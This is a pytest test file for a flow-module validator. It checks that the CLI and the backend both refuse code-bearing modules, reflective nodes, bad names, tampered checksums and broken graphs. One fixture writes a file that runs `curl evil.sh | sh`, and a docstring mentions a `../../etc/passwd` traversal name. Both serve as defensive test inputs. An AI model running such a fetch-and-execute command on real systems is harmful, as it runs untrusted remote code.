"""The module gate (T2.4 / D-6), attack by attack.

Two things are being asserted at once and they are inseparable: that each attack is refused, and
that the CLI and the backend refuse it *for the same reason on the same bytes*. The second is what
makes the promise "passed CI ⇒ will import" true. Two validators would drift, and the day they
drift, CI passes something the backend then runs anyway.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

from app.domain.modules.cli import main
from app.domain.modules.validator import (
    ModuleRejectReason,
    flow_sha256,
    validate_module,
)
from tests.fixtures.flow_fakes import builtin_registry

# A module the real compiler accepts: get_my_lots -> for_each_lot -> bump, the canonical shape.
GOOD_FLOW = {
    "name": "bump-daily",
    "entry_node_id": "lots",
    "nodes": [
        {"id": "lots", "type": "logic.get_my_lots", "inputs": {}, "edges": {"next": "each"}},
        {
            "id": "each",
            "type": "logic.for_each_lot",
            "inputs": {"item_ids": {"ref": "lots.item_ids"}},
            "edges": {"body": "bump"},
        },
        {
            "id": "bump",
            "type": "market.bump",
            "inputs": {"item_id": {"ref": "each.item_id"}},
            "edges": {},
        },
    ],
}

GOOD_MANIFEST = "\n".join(
    [
        "schema_version: 1",
        "name: bump-daily",
        "version: 1.0.0",
        "author: zlexdev",
        "description: Поднимает все лоты аккаунта.",
        "requires_nodes:",
        "  - logic.get_my_lots",
        "  - logic.for_each_lot",
        "  - market.bump",
        "",
    ]
)


def _write_module(root: Path, name: str = "bump-daily", flow: dict | None = None) -> Path:
    module_dir = root / name
    module_dir.mkdir(parents=True)
    (module_dir / "flow.json").write_text(
        json.dumps(flow if flow is not None else GOOD_FLOW, indent=2), encoding="utf-8"
    )
    (module_dir / "module.yaml").write_text(GOOD_MANIFEST, encoding="utf-8")
    return module_dir


def _verdict(module_dir: Path, expected_sha256: str | None = None) -> ModuleRejectReason | None:
    verdict = validate_module(module_dir, builtin_registry(), expected_sha256=expected_sha256)
    return None if verdict.ok else verdict.rejections[0].reason


def test_an_honest_module_is_accepted(tmp_path: Path) -> None:
    assert _verdict(_write_module(tmp_path)) is None


def test_a_module_carrying_code_is_refused(tmp_path: Path) -> None:
    """R-5. A module is data. The moment a .py can ride along, the registry has become a
    code-distribution channel nobody is auditing as one."""
    module_dir = _write_module(tmp_path)
    (module_dir / "evil.py").write_text("import os; os.system('curl evil.sh | sh')")
    assert _verdict(module_dir) is ModuleRejectReason.CODE_IN_MODULE


def test_the_data_only_check_is_an_allow_list_not_an_extension_deny_list(tmp_path: Path) -> None:
    """A deny-list is a list of the attacks somebody already thought of. This file has an innocent
    extension and is still refused, because it is not one of the three files a module has."""
    module_dir = _write_module(tmp_path)
    (module_dir / "setup.cfg").write_text("[metadata]")
    assert _verdict(module_dir) is ModuleRejectReason.CODE_IN_MODULE


def test_a_reflective_node_is_refused_by_capability_not_by_name(tmp_path: Path) -> None:
    """The whole reason phase 1 made nodes declare capabilities.

    pylzt.dynamic_call resolves an arbitrary market method by name — a module using it could do
    anything the token can, including spend. The filter keys off REFLECTIVE, so a reflective node
    added next month is caught the moment it declares itself, with no name list here to update.
    """
    flow = json.loads(json.dumps(GOOD_FLOW))
    flow["nodes"][2] = {
        "id": "bump",
        "type": "pylzt.dynamic_call",
        "inputs": {"_facade": {"literal": "market"}, "_method": {"literal": "managing_bump"}},
        "edges": {},
    }
    assert _verdict(_write_module(tmp_path, flow=flow)) is ModuleRejectReason.FORBIDDEN_CAPABILITY


def test_an_unknown_node_is_refused(tmp_path: Path) -> None:
    flow = json.loads(json.dumps(GOOD_FLOW))
    flow["nodes"][2]["type"] = "market.definitely_not_a_node"
    assert _verdict(_write_module(tmp_path, flow=flow)) is ModuleRejectReason.UNKNOWN_NODE


def test_a_graph_the_real_compiler_rejects_is_refused(tmp_path: Path) -> None:
    """Validation runs the REAL compile_flow, not a lookalike check — a module that validates but
    will not compile is a module that fails at run time instead of at review time."""
    flow = json.loads(json.dumps(GOOD_FLOW))
    flow["nodes"][0]["edges"] = {"next": "nowhere"}
    assert _verdict(_write_module(tmp_path, flow=flow)) is ModuleRejectReason.COMPILE_FAILED


@pytest.mark.parametrize("name", ["_evil", "UPPER", "a", "x" * 65, "with space", "dot.dot"])
def test_a_name_that_is_not_a_name_is_refused(tmp_path: Path, name: str) -> None:
    """MODULE_NAME_RE is a path-traversal guard, not a style rule: the name becomes a path segment.
    (``../../etc/passwd`` cannot be tested as a real directory name — which is the point of
    refusing anything that is not [a-z0-9-].)"""
    module_dir = _write_module(tmp_path, name=name)
    assert _verdict(module_dir) is ModuleRejectReason.BAD_NAME


def test_tampered_bytes_are_refused(tmp_path: Path) -> None:
    """The checksum is transport integrity (R-6): it proves these are the bytes that were
    reviewed, and nothing about whether the author is trustworthy."""
    module_dir = _write_module(tmp_path)
    assert _verdict(module_dir, expected_sha256="0" * 64) is ModuleRejectReason.CHECKSUM_MISMATCH


def test_the_honest_checksum_passes(tmp_path: Path) -> None:
    module_dir = _write_module(tmp_path)
    sha = flow_sha256((module_dir / "flow.json").read_bytes())
    assert _verdict(module_dir, expected_sha256=sha) is None


def test_a_manifest_naming_a_different_module_is_refused(tmp_path: Path) -> None:
    module_dir = _write_module(tmp_path)
    (module_dir / "module.yaml").write_text(
        GOOD_MANIFEST.replace("name: bump-daily", "name: something-else"), encoding="utf-8"
    )
    assert _verdict(module_dir) is ModuleRejectReason.BAD_MANIFEST


def test_a_missing_flow_is_refused(tmp_path: Path) -> None:
    module_dir = _write_module(tmp_path)
    (module_dir / "flow.json").unlink()
    assert _verdict(module_dir) is ModuleRejectReason.MISSING_FILE


def test_the_cli_accepts_what_the_backend_accepts(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    module_dir = _write_module(tmp_path)
    assert main([str(module_dir)]) == 0
    assert _verdict(module_dir) is None


def test_the_cli_rejects_what_the_backend_rejects(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """One fixture, both paths, same verdict — this is the assertion the single-validator decision
    exists to make possible."""
    module_dir = _write_module(tmp_path)
    (module_dir / "evil.py").write_text("import os")

    assert main([str(module_dir)]) == 1
    reported = json.loads(capsys.readouterr().out)["rejections"][0]["reason"]
    assert reported == ModuleRejectReason.CODE_IN_MODULE.value
    assert _verdict(module_dir) is ModuleRejectReason.CODE_IN_MODULE


def test_the_cli_exit_code_is_what_ci_reads(tmp_path: Path) -> None:
    """The lzt-flows workflow runs `lzt-flow-validate <dir>` and trusts the exit code. Driven as a
    real process, because that is how CI calls it — an in-process call would not catch a packaging
    mistake in the console script."""
    module_dir = _write_module(tmp_path)
    ok = subprocess.run(
        [sys.executable, "-m", "app.domain.modules.cli", str(module_dir)],
        capture_output=True,
        text=True,
        check=False,  # a non-zero exit IS the assertion
    )
    assert ok.returncode == 0, ok.stdout + ok.stderr

    (module_dir / "evil.py").write_text("import os")
    rejected = subprocess.run(
        [sys.executable, "-m", "app.domain.modules.cli", str(module_dir)],
        capture_output=True,
        text=True,
        check=False,  # a non-zero exit IS the assertion
    )
    assert rejected.returncode == 1
    assert json.loads(rejected.stdout)["rejections"][0]["reason"] == "code_in_module"


def test_the_cli_validates_against_built_ins_only(tmp_path: Path) -> None:
    """A module in the official registry must run on a stock install. If CI loaded plugins, a
    module could pass because the runner happened to have one installed — and then fail for
    everyone who does not."""
    source = Path("app/domain/modules/cli.py").read_text(encoding="utf-8")
    assert "load_plugins=False" in source


def test_a_rejection_carries_args_not_a_formatted_string(tmp_path: Path) -> None:
    """House rule, and it is the reason the bot and the API can both render a rejection: the
    caller decides the wording, not the exception."""
    module_dir = _write_module(tmp_path)
    (module_dir / "evil.py").write_text("import os")
    verdict = validate_module(module_dir, builtin_registry(), expected_sha256=None)
    rejection = verdict.rejections[0]

    assert rejection.name == "bump-daily"
    assert rejection.reason is ModuleRejectReason.CODE_IN_MODULE
    assert "evil.py" in rejection.detail
